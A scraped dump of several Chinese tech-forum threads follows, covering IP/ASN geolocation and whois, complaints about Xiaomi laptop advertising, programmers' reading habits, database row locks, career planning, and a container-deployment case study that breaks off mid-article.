{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在网络安全领域的威胁情报很火，它们其中的一个很大的特征就是 IP 地址的 AS 号、 IP 地址的国家、 CIDR 的国家等等。</p>\n<p>我想问一下，这个东西又不是固定的，它们将 ASN 、 IP 地址的地理位置等信息作为一个特征，是不是因为 AS 号和 IP 地址的国家分配 是最初就分配好的，基本不会有大变动(或者变动起来成本很大)</p>\n<p>希望懂相关 BGP 以及在 ISP 工作的朋友们解释一下</p>\n<p>谢谢！</p>\n</div></div>"], "reply": "5", "tittle": "像 AS 号、IP 地址的国家等等信息，变动的频繁吗？", "comment": ["国家对于实际服务器所在地是不准的，自我想大部分都不会有大变动", "我就 APNIC 的情况来说明，其他地方应该也差不多。\r", "1.IP 地址的 Whois 国家信息是和 IP 地址申请者的组织所在地绑定的，除非 IP 地址转让，否则无法更改， ASN 也是一样， APNIC 禁止了修改权限。申请成为会员的时候会审核会员所在地。\r", "2.没有 IP 地址的 AS 号的说法，只有 IP 地址广播在哪个 AS 号，也没有按某个大的段归到某个国家，一般是按申请顺序，谁先去申请就分配给谁，最小能申请到的 IP 地址块是 /24 ，所以一般判定某个 IP 归属哪个国家是看 APNIC 的 Whois 信息，但是并不是 IP 归属哪个国家就一定广播到哪个国家。\r", "3.接下来就说广播的问题，广播的话每个国家看政策，比如中国大陆地区只能广播 CNNIC 分配的 IP 地址。但是向 APNIC 也可以申请到 Whois 信息为中国的 IP 地址，但是却没法在中国大陆地区广播。很多 IP 地址定位的服务都是靠 Whois 信息，也有少部分靠广播信息。靠广播信息才能准确的知道 IP 地址具体位置。当然，广播信息也有数据库的，例如 RADB 。 RADB 是靠各个运营商或机房维护的，也是有造假的可能，要更准确的得到广播信息，就需要一台连接骨干网的有广播权限的路由器，获取路由信息。", "看 NOC 的心情，比如某天我突然想到了，就会去更正一下数据库，要是懒癌犯了的话，几百年都不会去动的", " 全部都可以 reassign 没有绑定这么一说，你愿意你可以把你的 IP 段，最小 /24 (IPv4) 和 /48 (IPv6) 单位的 whois 信息改成任何你想要改的信息，是不是真实的就看自觉性了。", " 但是在 IRR 的数据库里，母 IP 段的信息确实是固定的，除非 IP 转让，否则没法更改，这点你说的没错。"]},
{"content": ["<div class=\"topic_content\">最近打算出趟远门， 15 的 MBP 背着累，所以考虑买一台小米 12 带去路上打发时间，丢了也不行疼。\r<br>\r<br>之前在各大网站看过不少小米的宣传文章，虽然 12 的性能不行，但是对于买来装 Linux 的我来说应该不是问题，\r<br>\r<br>而且，看图片宣传很轻薄，颜值也算不错。正准备 JD 下单的时候，看了下差评，很多人说做工不好，\r<br>\r<br>于是本来考虑 jd 下单的我决定去实体店考察一下。\r<br>\r<br>\r<br>然后，我下午去本地的米家看了下实物， 那做工。。。。我真是服了！ \r<br>\r<br>厚度完全不是宣传的那样，显示屏打开后摇摇欲坠，细节惨不忍睹，惨不忍睹，惨不忍睹，\r<br>\r<br>看了一分钟闪人。。。 庆幸没手贱在 jd 上拍。。。要不退货又要折腾\r<br>\r<br>\r<br>吓出一身冷汗，赶紧上 taobao 拍了个 x1 Carbon 2017 压压惊</div>", "<div class=\"topic_content\">为什么我感觉不爽，因为销售上太多忽悠的成分了， 3000 块（实际是接近 4000 块）的东西， 广告做得硬是万把块的品质一样，而实际看了跟宣传的有差异，我个人觉得这是一种带忽悠的销售方式， 我很不赞同。 \r<br>\r<br>\r<br>很多回复说，我花几千块，想享受上万块的质量， 我觉得关键问题是，宣传上的忽悠，如果我不是去实体店看了实物， 可能就直接在 JD 拍了产品， 这样后期肯定又在退货上折腾时间。 而且，你们自己可以去 JD 上看看评论，看到底售品控后好还是不好。我想应该基本每个人都有这样的网购经历吧，你们觉得被虚假信息欺骗，很爽吗？ \r<br>\r<br>\r<br>另外，说我黑小米的，我觉得他还真不配我黑他， 我只是鄙视他的这种宣传行为， low 到爆 \r<br>\r<br>\r<br>而且， 我也一直没拿配置说事， 4G 内存我都说没问题，我可没说要他配 i7 Cpu 独立显卡 \r<br>\r<br>\r<br>至于键盘这些东西， 就跟口味一样，每个人口感都不一样，但是好的东西，还是有个标准在里面的。 \r<br>说键盘还不错的， 基本上，不是你不太挑剔，就是你还没有试过好的键盘。我个人觉得，你小米要做，就应该做一个还不错的东西出来， ppt 网页上宣传的那样完美， 实际试了下，就是一坨屎！</div>"], "reply": "159", "tittle": "小米笔记本的广告太 tmd 能忽悠人了", "comment": ["三四千有比较大的选择余地了，买什么小米", "不过讲真小米的渲染图和实物之间的差距是我见过的产品里最大的。", " 在宣传上，小米并没有说，我们是跟 MacBook 有得比的产品。哪家宣传不是做得高大上。这很 low 吗？", " 你特么开口就脏话,吃了大便的？看不懂内容？我一直在说小米的宣传夸大虚假宣传，这和你比喻是一回事？", " 恰恰小米的宣传是拿 air 在比吧，厚度那个图就是拿最薄和 air 最厚比，外形设计包括网站之类，哪个不是向苹果看齐。", "去实体店看了, 还好吧. 就这个价位", "你要理解，有一些水军，也有一些人见不得人好，所以你发这个贴，有些人的回复，我觉得直接 block 就好了", "很多人说一分钱一分货，是的，通常都这样。\r", "\r", "但是，在看到实物前，只看当时宣传的广告，应该很多人对这款 3000 多的笔记本很期待吧。如果用很少的钱买差不多的东西，为什么不呢？\r", "\r", "那后来都说一分钱一分货说明什么，说明小米的宣传和实际的东西还是差别太大了。\r", "\r", "你的东西值 3000 块，你吹牛 b 说 5000 块，我能接受，你吹牛拿上万块的东西来比较，我觉得就过了。而且也的确浪费了我时间，我来喷一下还不行？", "那 LZ 看不看洗发水广告？", "小米一直都是这种 low 逼宣传", "我用着就还行啊，除了键盘看起来 LOW 一点而已，毕竟 mac 带 bar 是这个价格 2 倍多了。 LZ 太钻牛角尖了。", "用过小米大部分产品\r", "说实话，大部分产品的水平在一般国产~国货之光的水平浮动，但是加上价格因素，可以说大部分产品都是值得购买的\r", "\r", "我认为的国货之光产品：\r", "小米扫地机器人\r", "小米平衡车\r", "小米手环", "抽奖中的小米充电宝一直没敢用，我还想多看看世界，多撩撩妹纸呢。。。另外：小米的东西我一直没关注过，更不用说买了，呵呵哒。。。", "楼主说 JD 差评如潮，看了一下，好评还是占更多。\r", "你所说的摇摇欲坠有些夸张，屏幕相比同价位的笔记本已经很良心了。您强调的细节「残不忍睹」，请问具体是哪些细节？\r", "我是很多年不用 Win", " 这个我赞同，我也不是全盘否定。\r", "\r", "比如我自己买的小米手环，小米音响，小米空气净化器，这些东西比之前买的国外产品要便宜很多很多，而且品质也远超价格。\r", "\r", "但是笔记本以及刚出的这个机械键盘这个确实不敢恭维", "当时在五彩城看到过，显示屏一碰软趴趴的晃。。。", "我华硕 VM510LI ，换上固态硬盘才 3400 左右，搞个黑苹果，愉快的玩耍~", "最不能忍的，接口好少啊，边框太丑", " 那么神船又怎么说呢", "我印象最深刻的是在实体店看实物，按了一下触摸板，尼玛，漏出了一大条缝隙出来，整个模具软塌塌的，然后我就彻底没兴趣了。", "233 是不是特别像仿真玩具？", "一直用联想~觉得国产中还不错的！", " 年收入 7 位数过的这么惨，完全没有生活质量啊。", "从 mbp 到 x1 carbon,也太穿越了吧~", "有个购买建议，就是一代的产品别买！到了二代，基本变动不大，但是会把市场反馈的许多问题给解决掉，这样实用性，可靠性会大大提高，这是就可入手了。所有我有买个小米手机 2 ，小米手环 2 ，小米盒子 2 等，目前使用下来都很满意。", " 好熟悉的 ID  中学时候在 tyvj 上办过 Boolean93 模拟赛 吗？", " 可能我很傻，因为我的 MacBook air 12 年到现在了，数是 5 年了吧。\r", "\r", "而且是用来开发 java 。", "有次去 mi 旗舰店 乍一看轻薄笔记本还不错 碰一下 屏幕晃得摇摇欲坠。。默默转去水果家", "毕竟价格就在哪里。我宁愿 3 千多买二手 macbook air 也不买小米。", "买东西最佳实践\r", "1 打开小米官网，看看最新科技都有多厉害\r", "2 知乎、论坛等搜索类似的相关索尼大法、配置单、等同类产品\r", "3 京东、亚马逊下单", "去实体店摸过，那松松垮垮的屏轴让人没有一点儿购买欲。", " 看来摇摇欲坠不是我一个人的观点", "早点看到就好了 前天买的 昨天退……", " 老兄名字也 6666 ，行为也 6666", " 小米现金相当充足啊，即使打着性价比的旗号，实际硬件就没亏过钱。说小米抠到有可能", " 嘿。。。。最近干嘛呢。。。", " 现金充足有鬼用， KPI 放在那呢", "买 X1 的我只能说真是信仰满满。", " 额，还真是我", " 首先夸张的宣传我觉得还算正常，尤其是小米，国内很多产品的广告都是如此。其次如果我想说脏话恐怕就不是 特么 这么委婉了。第三我不是很懂你最后那句有什么意义，所以提出的比喻。", "说实话，联想低端的笔记本一样很垃圾。", "12``还是算了吧至少拿 13``多少还是能玩玩游戏的，比如 lol ， 23333333333333", "同推荐联想，我 14 年买的，现在都没毛病", " #138 X1C 还挺不错的吧.", "正准备买个小米的本本呢，看来不用考虑它了。谢谢", " 每个人的经验不一样，说不准你喜欢呢，哈哈哈", "小米，乐视都是半斤八两的低俗营销企业。", "「另外，说我黑小米的，我觉得他还真不配我黑他， 我只是鄙视他的这种宣传行为， low 到爆」\r", "\r", "我怎么觉得是你不配黑他？", " #68 还有这个，买几百万车的人\r", "「手贱在 jd 上拍，要不退货又要折腾 」\r", "买个 3000 块的东西，手贱了还要退货？\r", "\r", "我总资产连几百万都没有，家里面的吸尘器都值几万了。", " 华为水军多，黑一黑有利于社区平衡，对维护世界和平有好处。", "买什么不好，为什么要选小米？", "x1 carbo 的确不错，重量轻，坚固耐用，续航好， 14 寸屏幕刚好，键盘手感好，还有大电流 usb 口，适合商务使用。", "应该和批次有关系，我第一批买到的，没有这个问题，后来我同事买，也有你说的这个问题，然后他也退了", "多花点钱买 Thinkpad X1 或者 X260 ，或者低配版的 Surface pro4 吧。", "小米一直是在卖噱头~  \r", "人家早就用的技术,雷军拿来当宝如数家珍\r", "小米就像小米一直崇尚跑分一样\r", "现在除了小米的脑残粉外,能被忽悠的都是一些不太懂的人\r", "以前去实体店特意看过小米电脑 ,我的感觉那就是一陀", "当时刚出的时候看到渲染图左边的 HDMI 和 USB 口做工后就兴趣全无了。", " 三四千的本推荐几个？", "我只好奇，程序员是怎么做到买得起法拉利的", "所以，是哪句广告？或者哪页 ppt 和事实不符？"]},
{"content": ["<div class=\"topic_content\">面试的时候，面试官说他自己十多年行业经验，每年坚持看十几本技术方面的书，请求大家一个问题，最近两年，他看的是什么书呢，可提供书的领域方向，书名更佳。\r<br>他很轻视现在的视频学习途径，博客学习途径， github 途径.... (除了看书)，还有各位大牛们 ，你们一年看几本书呢（不算没看完的，面试官说了，没看完的就别提了）</div>"], "reply": "87", "tittle": "程序员每年至少要看几本书？", "comment": ["每年啃十几本，那得年薪百万打底了", "书不在多，在精", "看书比较系统，而且能灵活的调整进度。", "公务员每年至少要看几本书", "楼主每年坚持看十几本技术书的工资为多少？", "没看完的不算？那么 0", "技术书籍也就一两本吧... 其他类的看的比较多,最近在看<浮生六记>和 <嫌疑人 X 的献身>", "技术书籍普遍跟不上潮流，所以技术书籍基本为 0 ，当然这要除开那些经典的， 类似什么算法分析啊，数据结构啊， TCP 详解啊\r", "\r", "剩下的就是 文学类的书籍了，，那就真的多到数不清了。", "技术书籍看的少，看了一下我的豆瓣，去年看了 20 多本，看的比较杂。\r", "技术还是喜欢网上 mooc 或者其他方式学习，感觉书籍出来都有几年了。", "谈不上看书，只是用到哪儿，看哪儿的文档而已。实在不行看源码。", "看技术书从来没从头到尾看完过，只找重点看", " [请求大家一个问题，最近两年，他看的是什么书呢？] \r", "\r", "你这是把我们当算命的啊，鬼知道别人看什么书？\r", "说不定他就是和你装逼一下而已，其实看的都是《三生三世十里傻叉》之类的书。\r", "毕竟 [轻视现在的视频学习途径，博客学习途径， github 途径] 不像是真正看了很多书的人的行为。", "现在技术大都从文档接触", "现在技术性书籍基本都有个关于时效性的问题，除却某些经典类著作还是在网上找找文档看看", "每年坚持看十几本技术方面的书, 别装逼了, 不可能的", "今年计划看 15 本左右。", "最近看的书都是..哲学 /软技能的。技术方面一直没抽出整块时间看存的书，主要靠看论文和 tutorial 。", "那要看一年里有多少时间迷茫了🙈", "0", "如果说技术书的话......\r", "\r", "以前买了几本 react 的书，书里的例子是 0.X 的，还没来得及看，版本已经迭代到 15 了！", "留个爪牙，我读过的书： ", "看书并进行实践才有意义", "去年总共卡看书 29 本,20 本是关于技术的.\r", "\r", "技术书籍也可以大致分为理论性和实践性.\r", "\r", "理论的书籍一般读起来比较慢,好多东西需要思科和深度扩展,如《 TCP/IP 详解》\r", "\r", "实践的书记一般读起来很快,有些甚至一个下午就读完,如《用 Python 写网络爬虫》,\r", "\r", "这本书我当时花了三个小时读完的,又花了一个小时根据目录整理的知识.\r", "\r", "最后说一点**看书不等于学知识**", "真以为看书就比看视频、博客高贵吗？每个人都有适合自己的学习方式，有所得就好。就国内出版的技术书籍来说，我感觉真心和国外有差距。", "几年看一本", "过干瘾", "程序员还看书么，买一本 python 或者 swift ，不知道是几年前的语法，坑死了，书早就跟不上时代了，撰写出版发售等你买到不知道多久过去了，很多内容早就过时了， http 都出到 2 了，书上还不到 1.1 ，看看计算机原理还差不多。", "这个还有什么硬性规定？", "这几年看了不少书，最近搬家整理，发现自己之前看的书很宽泛，但是每本书在当时来说都让我获益匪浅，现在在一个领域越做越久，感觉是时候深入进去了，不擅长的东西让更适合的人来做，自己在一个方向沉淀下来。但是我个人认为这种过程在技术成长的道路上也是必然要经历的。\r", "正在出书，有兴趣的可以参考我发的帖子， ", " 。 PO 主见谅。", "书看得很少了，我就是以视频博客学习途径为主。", "一个月看一本的样子吧，我都喜欢反复看一本技术书，不然吃不透，还有记性也不好，总容易忘记", "看不看书都不妨碍你成为一个优秀的程序员，但是一个有趣的人还是多少会读点书的", "最近在恶补基础，一月一本砖头。\r", "如果工作忙的话，这看书的进度还是挺累的。", "干这行得一直保持看书，未必是要很认真的看，但要保自己的技术视野。\r", "不求精通，但求用到的时候知道哪里会有答案", "技术类经典书（退一步讲十年内不过时），挑出个百来本不是问题。\r", "这好比现在取笑有些人拿知乎装逼一样，真正从网络论坛上获取的只是表象知识，要建立起一套完整的知识体系，还是得系统学习。看书是其中一种方法。", "说实话 看书再多不如多实践几个项目 每次感觉都是看明白了 让你自己写的时候就尴尬了", "看书就好好看 别功利心这么强\r", "“ XX 本书可以让你 XXXX ” “ XX 小时的投入可以 XXXX ” 都是伪概念\r", "读同一本书或者花同样的时间 你觉得你的收获跟别人一模一样吗", "经典的书买来看看挺好的，但是现在鱼龙混杂，所以一般的知识还不如网上自己找找", "他的语言是否准确生动呢？", " 还真是“我读的”", "主要是按需学习，看专业领域书籍看得不是很多，没事喜欢读读鸡汤类书籍", "个人一年计划在 15 本书左右，包括计算机、文学、经济类的，计算机的书要精读的话，一年下来只能排个位数。", "从不看书的路过，轻小说都不看", " \r", "\r", "喝水的时候，看到你的回复。\"三生三世十里傻叉\"\r", "\r", "键盘进水了。", "我差不多最近两年买了五百来本书，看了大概 300 到 400 本", "每年看十几本，这人不是牛逼就是装逼。。说句实话，一般人真做不到。一个月一本书，对于码农这种平常压力如此大的职业，真是太难了，而且码农接收知识的途径除了书还有非常多的途径", " 自己做不到不能就认为别人做不到吧。其实看书的时间挤挤都是有的，把玩手机的时间分点给阅读，一年应该都不止多读 10 本书", "学生时间多，一年大概六十本左右。", " 别人能做到就是牛逼啊，兄弟，我不是别人做不到，而是说做到很难。不信，我们发起一个统计贴，看看有多人达到这个指标了", " 其实反过来想， 10 本书一年都被当作是难事，对于文化大国的我们真是要反思了。走到国外，经常看到路人带一本书，等车阅读，地铁阅读，我们这里好像大家走到哪里都低头玩手机。", "买个 kindle ，文学经济类的，上下班路上看看，大约一到两周一本。\r", "技术类的书一般都买实体书，晚上下班到家后以及周末抽时间仔细看， 2 个月到 3 个月一本。近期比较火、比较流行的东西不买书，网上找教程，因为有些技术发展的速度太快，实体书跟不上。\r", "技术类看书的内容主要是要系统的掌握某部分内容，有些网上的内容并不能照顾到方方面面，而且我觉着有很多在线视频类的教程节奏太拖沓。看书有时候看的时候可能不需要太仔细，之前没接触过的内容实际操作下，之前有过了解的内容可以粗略看看。\r", "我给自己定的目标是技术类的一年 4 本，其他类型的一年 12 到 18 本左右吧。", " 很同意啊，大兄弟，从我做起，好吧，努力学习中", "xx 天看完一本书借此提升自己就跟吃啥补啥一样的原理。", "每年都看一遍 TCPIP 详解卷 i", "每年至少要买几本", "可以不看。但至少要买十几本。", "重点是看完吸收多少", " 我低头玩手机有一半时间是在看书。这个还是看人", " 300 到 400 本真是有点夸张。基本每天一本的效率啊", " 其实水分很多，因为很多类型是差不多的书，虽然已经是挑选过的，但是看到后来，很多东西是相通的，可能一本书里面能找到新意的就很小一部分，看目录挑选自己关心的那部分，可能正能算不错的就 50 本。我还坚持写了 100 多篇书评。", " 还有就是我不用工作，所以有大把时间，前几年我的生活基本就是每天在茶楼看书。", " 唉这是前几年的事情了，现在伦敦也都是玩手机了。", "18 到 36 天精通 xx 系列", "技术这种东西 与时俱进的肯定上网查文档  除了经典书和对口书  看书来学习新技术就是很落后的行为  新技术一直在改变  如果 lz 说的那个人不是特别牛逼的话，估计也只是个装逼的货，一本好书即便你看完你也可能没法完全理解", "我觉得软件技术更新这么快，基本上书经过写作、编辑、出版再到读者手上，基本上已经过时了。\r", "不如直接看技术文档，或者 SO 、技术博客来得直接、实用。\r", "而且像我这种强迫症，拿一本书一定要从第一页一直读到最后一页，浪费时间不说，效果根本不好。不如实战中用到了直接 Google ，快速解决问题，查的多了，这些知识就会慢慢形成体系。然后找个提纲挈领的文章、教程看一下，就全都贯通了。在这个时代更适合自下而上构建知识体系，比自上而下系统化的方法更实用。\r", "\r", "个人愚见。", "大三的时候，曾半学期看了 150 多本专业相关的…… CS", "学校时候还有时间看看 工作后没时间了", " 跪拜", "不夸张的说看十几本书我也可以（一个月看一本，每天十几页不过分吧），但是我不能保证全部看懂，因为很多书我都是反反复复读了好几遍的，每一次读都有新的理解。所以比较这种东西没什么意义的。", "好多年没看过专业书了。。都是社区+github  ", " ", "有点赞同他, 其实看书是比视频更有效的方式 另外的方式是看源码, 比看书更有效.", "一个人喜欢用什么事物标榜自己，多半都是实际做不到，拿来装 13 。\r", "真正喜欢读书的人，不管读过什么，都不会随意拿出来炫耀。", "一个月一本. 但是切忌以读书稍多他人而自满.", "有很多资料都是电子版的", "感觉看书效果并不好。。。还是实践几个项目比较靠谱", "技术类，个位数。最近在看《深入 Linux 内核架构》。这种书我不信他一年能啃 20 本。我比较赞同腾讯的养成评价体系，看书占个人成长的 30%", "表示技术书一直当工具书翻翻看看，许多技术书才出版就过时了（蜜汁微笑.jpg ）\r", "平时还是比较多看文学类的书", "几乎不看实体的技术书籍了。\r", "\r", "现在看的多的就是文学类啦。", "那些每年看是基本甚至几十本的技术书，难道他们就那么有时间吗？就算看，也就像读课文一样，看完就没下文了，我所理解的是每年至少看 1-2 本经典型的书籍，慢点看，没关系，但一定要看懂，做好笔记，不然看那么多有什么卵用？就像学技术一样，学了那么多语言，最后每一个精通的，我的经验告诉我是这样。", "因爲計算機的知識和內容還是很多的，一年看幾十本的人我感覺還是有好些的。\r", "上面很多人說的內容的我的一些看法：\r", "许多技术书才出版就过时了 -> 恩，有些書是這樣，這部分書裏面框架書多。但是很多書都不一定，比如說一些本質的或者一直一來沒什麼變化的書或者一些國外出版社出版的很多新書，比如 manning 出版的那些。另外很多人都是直接看英文原版書的。因爲國內引進的書並不多，而那些翻譯的書有些翻譯差、有些翻譯後已經離原書出版的時間隔很久了。\r", "感觉看书效果并不好 -> 我的感覺是這是錯的，因爲實踐項目的成本其實我感覺比書的大的，項目有些有它的業務邏輯，而且裏面的一些原理有時候是很難從代碼裏看出來的。好的技術書會講一個東西是什麼、怎麼做，用一個麻雀雖小、五臟俱全的例子來描述這個東西，並且再進行衍生。而且從書裏學到的東西更系統。\r", "不如直接看技术文档，或者 SO 、技术博客来得直接、实用。  -> 很多文檔是和書差不多的，比如說 Akka 的文檔、 Rust 官方語言介紹的文檔。所以看技術文檔和書其實是一樣的。看書的人裏很多也會有選擇的看文檔或者相關的 coursera 的視頻的。 SO 、技術博客只是對前 2 者的補全。\r", "\r", "學習是啓發式的，而且多種方式的，但是讀書毋庸置疑是裏面比較好和高效的一種方式。", "已经几年没看书了，用的都是他鄙视的学习方式。\r", "最近喜欢上视频学习，不过不是那些专门的 收费 /免费 的视频教程，而是看一些播主的闲谈或者讲座的视频。", "现在技术更新太快了，等书出来，黄花菜都凉了。直接官方文档走起！", " 我持反对意见，年薪百万的应该没有时间看书", "感觉 1~2 本对我来说已经要求很高了。。。。", "每 2~3 个月学习一本足够。", "工作 2 年多 一本没看过。。。基本是 视频博客", "看了起点的记录，我 803 天里阅读了 118 本小说总共 3 亿+字\r", "技术书籍大概一年 5 本左右吧，以看官方 tutorial 为主，都是相互穿插着看的\r", "相比纸质，我更喜欢看电子版本的，不过如果觉得不错，会买纸质支持正版"]},
{"content": ["<div class=\"topic_content\">数据库加行锁，是加到哪里的？</div>"], "reply": "3", "tittle": "求解一道面试题", "comment": ["google 来的： InnoDB 行锁是通过给索引上的索引项加锁来实现的", "答案不唯一，看有没有主键，有没有索引，查询条件，锁的位置也不一样。", "首先是库锁、表锁和行锁，如果行上有索引，还会在索引上加锁；访问方式不同，还分为共享锁和排它锁_(:з」∠)_"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>搞的阿里云服务器挂了$$玩 FIFA ，但是阿里云的服务器明明在香港，可是 GeoIp 却在美帝，这样 p2p 搜到的人都是美国人。。。。</p>\n</div></div>"], "reply": "1", "tittle": "求科普为什么阿里云的 ip 用 GeoIp 定位出来是在美帝呢?", "comment": ["ip 广播了吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近面试，面试官免不了问：你对未来自己的规划是什么？\n我： balabala...\n然后我都会反问面试官：以你现在的经验，如果回溯到刚毕业那时候的自己，你会怎么规划自己的开发之路？\n（感觉很多人会说：我会选择不做开发~~）</p>\n</div></div>"], "reply": "15", "tittle": "以五年后的自己推导现在的自己，你们会怎么规划自己？", "comment": ["规划就是从一个低龄中二变成一个大龄中二而不是大龄现充（逃\r", "\r", "正文：\r", "每年学一门新语言吧，补基础，至少 miniCPU （已实现）、 mini 编译器（实现中）、 miniOS （规划中）都走一遍。\r", "然后么，沟通技能其实很重要，有时候能大幅减少你在垃圾业务中所用时间去成为一个“更好的人类” www （逃", "大概…… 会是买房吧……", "买房，买股票", "买房买股票来钱太慢了\r", "\r", "记一两期彩票头奖号码，再买房，然后在限制换汇之前卖房，肉翻", "应该就是买房吧，  五年后的我，估计会让我筹钱然后买几套房囤着， 这二逼还在那天天上班，真服", "二楼开始歪楼。\r", "\r", "一楼二楼画风突变啊。", "创业误国,买房兴邦", " 哈哈哈，那从这楼开始，回到正题吧。\r", "\r", "打电话给爱吃西红柿跟他说他小说很不好看，叫他别写了。=。=这样我就不会入坑了。", "咸鱼一条，后来翻了个身，还是咸鱼。", "砸锅卖铁燕郊买套房，然后一点点过渡换成城里的房子，身价千万不是梦！", "感觉找女朋友", " 有点意思， miniCPU 是什么？纯软件模拟的还是硬件搭出来的，用的什么参考资料？", " \r", "\r", "其实挺简单的，如果只是一个不带分支预测的 mips\r", "\r", "\r", "将近三年前写的了，在 FPGA 上，课设的程度而已吧", " #13 点个 start ，有空看看，还没接触过 FPGA 呢", " 多谢！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"https://i.v2ex.co/rPWrG4QP.jpeg\"></p>\n<p>[编者的话] 容器是这两年最热的一个话题，去年大家都在谈 Mesos 、 Kubernetes 、 Swarm ，究竟哪家的挖掘技术强，今年容器技术的进一步普及，更多的人更关心容器技术如何落地，下面我们就基于一个实际的案例来聊一下容器落地遇到的问题。</p>\n<p><strong>背景：某银行数据中心计划搭建一个基于容器的 PaaS 平台</strong></p>\n<p>###持续集成\n持续集成是容器一个绕不过去的话题，无论哪家容器厂商都一定会谈到，<a href=\"www.shurenyun.com\" rel=\"nofollow\">数人云</a>关于持续集成，最开始用的是 drone ，一个小众的持续集成工具，将 drone 内置在平台上，通过平台的持续集成功能可以方便的实现持续集成的配置和管理。</p>\n<h4>drone 的坑</h4>\n<p>一开始我们觉得这是一个很好的工具，但是后来发现其实没有想象中的那么美好，它的问题：</p>\n<ul>\n<li>对 SVN 的支持不好</li>\n<li>容易出问题，因为数人云平台所有的组件都是容器化的，所以若使用 drone ，则需要使用 docker-in-docker 技术，但是该技术已经是一个不再被维护的技术了，所以继续使用的风险很大。</li>\n</ul>\n<h4>Jenkins 是个好工具</h4>\n<p>Jenkins 是一个好工具，功能强大且稳定，基于 Jenkins 实现的持续集成基本没有花费什么开发的时间，通过脚本将代码构建和平台连接在一起即可轻松实现 CI/CD 。</p>\n<h4>总结</h4>\n<p>往往用户需要的并不是那些看起来很酷的功能，真正需要的是能够实际解决问题的方案，即使这个方案很 low 。</p>\n<h3>配置管理</h3>\n<p>在我看来，容器是一个革命性的产物，改变了软件交付的方式，它开箱即用的特性消灭了程序员常说的一句话 “在我这里运行时正常的啊！”； 它快速部署，环境无关的特性帮助运维人员提高了工作效率，但是任何事情都有其两面性，它的开箱即用，环境无关带来好处的同时，也带来了问题——配置文件。</p>\n<h4>传统应用在容器时代面临的第一个问题</h4>\n<p>一般而言，每个程序都会有一个或多个配置文件，里边记录着 DB 地址、账号、密码、缓存地址等信息，在容器时代之前，应用程序一般的流转方式是“从开发-&gt;测试-&gt;生产”：</p>\n<ul>\n<li>\n<p>开发同学交付一个编译之后的二进制文件，源文件（解释执行）或者代码仓库中某一个 tag ，同时附带一个 release notes ；</p>\n</li>\n<li>\n<p>测试同学拿到开发同学交付的内容后，就将其部署在自己的测试环境中，如果 release notes 中说明了有配置信息需要更新或依赖文件版本需要升级，会依照文件进行调整；</p>\n</li>\n<li>\n<p>如果测试通过，确定可以投产，那么就将其交付给运维同学进行生产部署。</p>\n</li>\n</ul>\n<p>此时有一个问题，开发、测试、运维每个环节都会自己维护配置文件，如果使用了容器，那么配置文件管理就是很麻烦的问题了，因为配置文件被放到了容器里，若想修改配置文件就不是那么简单的事情了，所以这就是传统应用在容器化时面临的第一个问题，当然这个问题也不是不能解决，一般而言，有以下几种解决方案：</p>\n<ul>\n<li>\n<p>挂盘，将配置文件放到外部存储中，然后将该目录挂到容器中；</p>\n</li>\n<li>\n<p>生成新的镜像，基于 Docker 文件系统的特性，使用测试环境的配置文件覆盖开发环境的镜像，从而得到测试环境的镜像，同理，使用生产环境的配置文件覆盖开发环境的配置文件得到生产环境的镜像，使用该方案会导致每个环境都有一个镜像。</p>\n</li>\n</ul>\n<h4>容器时代配置管理的正确打开方式</h4>\n<p>以上分析了传统应用容器化基本都会遇到的一个问题，而且也没有给出很好的解决方案，下面我们来谈下容器化时代配置管理的正确打开方式。</p>\n<p>其实通过上面问题的描述，我们可以很容易的找到问题的根本原因：配置文件本身是一个本地存储状态，要对其做无状态改造，对于配置管理的无状态改造一般是通过配置中心来完成的，即应用通过配置中心获取配置信息，无需读取本地配置文件，但是这个问题更麻烦，要解决这个问题需要首先解决两个问题：</p>\n<ul>\n<li>\n<p>要先有个配置中心</p>\n</li>\n<li>\n<p>要改代码，使其可以适配配置中心</p>\n</li>\n</ul>\n<p>随着容器的普及，未来配置中心肯定会逐渐成为程序的标配。</p>\n<h4>最终选择的解决方案</h4>\n<p>关于容器时代配置文件的问题，上边大概提到了 3 种方案，在最终落地的时候选择的是哪一种呢？答案是第二种——生成新的镜像。这是一个很 low 的方案，为什么没有选择另外两种呢？ 我们来解释下原因：</p>\n<ul>\n<li>\n<p>方案一[挂盘]， 这个方案会给容器产生另外一个状态，外部文件，不符合 cloud 的思想， pass ；</p>\n</li>\n<li>\n<p>方案三[配置中心]，成本太高，周期太长，而且需要改代码，往往之前的应用已经被维护了很多年，修改其配置接口，风险太大。</p>\n</li>\n</ul>\n<h4>总结</h4>\n<p>虽然这个选择从技术上来看很 low ，但是个人认为，使用一个不太优雅的方案帮助一个新技术快速落地，然后推动其快速前进，比一直纠结于方案是否高大上，是否优雅等，而导致新的技术一直被悬在空中更好，就像大家一直在争论 Mesos 、 Kubernetes 、 Swarm 究竟哪个更好，现在也没有一个结论，与其争论这么多虚的，不如仔细想一下自己的问题是什么，究竟哪个技术更适合自己。</p>\n<h3>日志</h3>\n<p>目前使用 ELK 作为日志方案。</p>\n<h4>传统应用的坑</h4>\n<p>一般而言，传统的应用都是把日志写到一个指定的路径下，然后通过 Logstash 采集日志并送入 Elasticsearch 进行存储，但是这种应用如果直接容器化之后就会带来一个问题——应用的日志文件应该如何存储。</p>\n<ul>\n<li>\n<p>方案一：放到容器里</p>\n</li>\n<li>\n<p>方案二：挂盘，写到外部存储上</p>\n</li>\n</ul>\n<p>两种方案都有一些问题：</p>\n<ul>\n<li>\n<p>放到容器里，逻辑上最简单，不需要做任何改动，但是它的问题是，怎么从容器中把日志取出来。</p>\n</li>\n<li>\n<p>通过挂盘，把容器日志写到外部存储，然后沿用传统的 Logstash + ES 的方式处理日志，听起来很美好，但是如何建立容器和日志的对应关系？</p>\n</li>\n</ul>\n<h4>容器时代日志的正确打开方式</h4>\n<p>按照之前的惯例，我们先提出在容器时代，日志的正确处理方式，如果应用使用 Docker 进行交付，不建议写日志文件，直接将日志写入标准输出即可，然后 Logstash 通过 Docker 的 log-driver 